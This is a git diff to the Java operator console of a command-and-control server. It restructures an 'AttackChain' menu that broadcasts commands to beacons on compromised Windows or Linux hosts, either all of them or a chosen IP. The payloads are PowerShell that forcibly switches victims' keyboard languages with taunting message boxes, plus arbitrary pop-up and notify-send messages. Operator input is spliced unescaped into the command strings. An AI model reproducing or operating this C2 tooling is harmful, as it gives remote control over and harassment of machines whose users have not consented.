@@ -9,6 +9,8 @@ import java.util.Scanner;
 import java.util.Queue;
 import java.util.HashSet;
 import java.util.Arrays;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 public class C2ServerUserHandler implements Runnable{
     private String RED = "\u001B[31m";
@@ -35,6 +37,9 @@ public class C2ServerUserHandler implements Runnable{
     // Queue of messages to be printed to the CLI
     private Queue<String> messageQueue;
 
+    // Regex Pattern to match to IP Addresses
+    private Pattern ipAddressPattern;
+
     /**
      * Class to handle input from the user controlling the C2
      * and send it back to the C2 Server.
@@ -48,6 +53,7 @@ public class C2ServerUserHandler implements Runnable{
         this.beaconsWaitingForMFA = new HashMap<>();
         this.currentUserPath = "";
         this.messageQueue = new LinkedList<String>();
+        ipAddressPattern = Pattern.compile("^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$", Pattern.CASE_INSENSITIVE);
     }
 
     /**
@@ -331,6 +337,7 @@ public class C2ServerUserHandler implements Runnable{
             } else if(currentUserPath.equals("Command Linux")){
                 sendCommand("Linux");
             } else if(currentUserPath.equals("AttackChain")){
+                // Menu
                 printAttackChain();
                 System.out.println("1. THE GOOSE");
                 System.out.println("2. Change Keyboard Language [EASY]");
@@ -340,64 +347,123 @@ public class C2ServerUserHandler implements Runnable{
                 System.out.println("6. Back");
                 System.out.println();
                 System.out.print(currentUserPath + " >> ");
-                userInput = userInputScanner.nextLine();
+                String userAttackChainChoice = "";
+                userAttackChainChoice = userInputScanner.nextLine();
+
+                // Validate Selection and choose scope of attack
+                String os = "";
                 String target = "";
                 HashSet<String> validInputs = new HashSet<>(Arrays.asList("1","2","3","4","5"));
-                if(validInputs.contains(userInput)){
-                    System.out.println("Enter IP address of target, 'Windows','Linux', or 'All");
+                if(validInputs.contains(userAttackChainChoice)){
+                    System.out.println("Enter 'Windows','Linux', or 'All");
                     System.out.print(" >> ");
-                    target = userInputScanner.nextLine();
+                    os = userInputScanner.nextLine();
+                    os = os.toLowerCase().strip();
+                    if(os.equals("windows") || os.equals("linux")){
+                        System.out.println("All " + os + " or a specific IP (Enter 'All'/'x.x.x.x')");
+                        System.out.println(" >> ");
+                        target = userInputScanner.nextLine();
+                        target = target.toLowerCase().strip();
+                    } else {
+                        target = "all";
+                    }
                 }
-                if(userInput.equals("1")){
+
+                String windowsCommands = "";
+                String linuxCommands = "";
+
+                // Attach Chain implementations
+                if(userAttackChainChoice.equals("1")){
                     // TODO: Figure out how to launch the goose.
-                } else if (userInput.equals("2")){
+                } else if (userAttackChainChoice.equals("2")){
                     // Set their Keybaord language to French for 60 seconds, then change it back to English
-                    String commands = "";
-                    commands += "Set-WinUserLanguageList fr-FR -force;";
-                    commands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
-                    commands += "[System.Windows.MessageBox]::Show('Have Fun Learning French MF');";
-                    commands += "Start-Sleep -Seconds 60;";
-                    commands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
-                    commands += "Set-WinUserLanguageList en-US; -force";
-                    C2server.broadcastToBeacons("Command Windows " + target + "_" + commands);
-                } else if (userInput.equals("3")){
+
+                    // Windows
+                    windowsCommands = "";
+                    windowsCommands += "Set-WinUserLanguageList fr-FR -force;";
+                    windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
+                    windowsCommands += "[System.Windows.MessageBox]::Show('Have Fun Learning French MF');";
+                    windowsCommands += "Start-Sleep -Seconds 60;";
+                    windowsCommands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
+                    windowsCommands += "Set-WinUserLanguageList en-US; -force";
+
+                    // Linux
+                    linuxCommands = "";
+                    // TODO Figure out how to mess with Linux Keyboard
+                } else if (userAttackChainChoice.equals("3")){
                     // Change their Keybaord language every 30 seconds
+
+                    // Windows
                     HashMap<String, String> languages = new HashMap<>();
-                    String commands = "";
+                    windowsCommands = "";
                     languages.put("French", "fr-FR");
                     languages.put("German", "de-DE");
                     languages.put("Arabic", "ar-SA");
                     languages.put("Cantonese", "zh-HK");
                     languages.put("Italian","it-IT");
                     for(String language : languages.keySet()){
-                        commands += "Set-WinUserLanguageList " + languages.get(language) + " -force;";
-                        commands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
-                        commands += "[System.Windows.MessageBox]::Show('Have Fun Learning " + language + " MF');";
-                        commands += "Start-Sleep -Seconds 30;";
+                        windowsCommands += "Set-WinUserLanguageList " + languages.get(language) + " -force;";
+                        windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
+                        windowsCommands += "[System.Windows.MessageBox]::Show('Have Fun Learning " + language + " MF');";
+                        windowsCommands += "Start-Sleep -Seconds 30;";
                     }
-                    commands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
-                    commands += "Set-WinUserLanguageList en-US -force;";
-                    C2server.broadcastToBeacons("Command Windows " + target + "_" + commands);
-                } else if (userInput.equals("4")){
+                    windowsCommands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
+                    windowsCommands += "Set-WinUserLanguageList en-US -force;";
+
+                    // Linux
+                    linuxCommands = "";
+                    // TODO Figure out how to mess with Linux Keyboard
+                } else if (userAttackChainChoice.equals("4")){
                     // Change it back to english in case we mess up
-                    String commands = "";
-                    commands += "Set-WinUserLanguageList en-US; -force;";
-                    commands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
-                    commands += "[System.Windows.MessageBox]::Show('Sorry about that here's english')";
-                    C2server.broadcastToBeacons("Command Windows " + target + "_" + commands);
-                } else if (userInput.equals("5")){
+                    
+                    // Windows
+                    windowsCommands = "";
+                    windowsCommands += "Set-WinUserLanguageList en-US; -force;";
+                    windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
+                    windowsCommands += "[System.Windows.MessageBox]::Show('Sorry about that here's english')";
+
+                    // Linux
+                    linuxCommands = "";
+                    // TODO Figure out how to mess with Linux Keyboard
+                } else if (userAttackChainChoice.equals("5")){
                     // Send a message box
-                    String commands = "";
-                    commands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
                     System.out.println("Enter A Message to Display: ");
                     String message = userInputScanner.nextLine();
-                    commands += "[System.Windows.MessageBox]::Show('"+ message+ "');";
-                    C2server.broadcastToBeacons("Command Windows " + target + "_" + commands);
-                }else if (userInput.equals("6")){
+                    
+                    // Windows
+                    windowsCommands = "";
+                    windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
+                    windowsCommands += "[System.Windows.MessageBox]::Show('"+ message+ "');";
+
+                    // Linux
+                    linuxCommands = "";
+                    linuxCommands += "notify-send" + message;
+                }else if (userAttackChainChoice.equals("6")){
                     currentUserPath = "";
                 } else {
                     System.out.println("Invalid Input");
                 }
+
+                // Send the commands
+                HashSet<String> inputsToSendCommandsFor = new HashSet<>(Arrays.asList("2","3","4","5"));
+                if(inputsToSendCommandsFor.contains(userAttackChainChoice)){
+                    // Send commands based on os/scope
+                    if(target.equals("all")){
+                        if(os.equals("windows") || os.equals("all")){
+                            C2server.broadcastToBeacons("Command Windows All_" + windowsCommands);
+                        }
+                        if(os.equals("linux") || os.equals("all")){
+                            C2server.broadcastToBeacons("Command Linux All_" + linuxCommands);
+                        }
+                    } else {
+                        if(os.equals("windows")){
+                            C2server.broadcastToBeacons("Command Windows " + target + "_" + windowsCommands);
+                        } else {
+                            C2server.broadcastToBeacons("Command Linux " + target + " " + linuxCommands);
+                        }
+                    }
+                }
+                
             } else if(currentUserPath.equals("Request")){
                 printRequest();
                 System.out.println("1. Request from ALL Windows Clients");
